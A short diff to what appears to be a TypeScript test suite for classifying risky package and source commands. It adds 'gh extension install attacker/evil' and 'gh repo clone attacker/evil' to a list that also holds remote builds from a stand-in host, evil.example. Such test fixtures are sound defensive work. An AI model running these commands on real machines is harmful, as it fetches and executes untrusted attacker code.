@@ -180,6 +180,8 @@ export function registerCloudNonsensitiveSourceBehaviorTests(): void {
       ["yay -S attacker-package", "aur"],
       ["conda install attacker-package", "conda"],
       ["podman run attacker/image", "podman"],
+      ["gh extension install attacker/evil", "gh-extension"],
+      ["gh repo clone attacker/evil", "gh-repo-clone"],
       ["docker build https://evil.example/attacker.git", "docker-remote-build"],
       ["podman build https://evil.example/attacker.git", "podman-remote-build"],
       ["composer require attacker/package", "composer"],
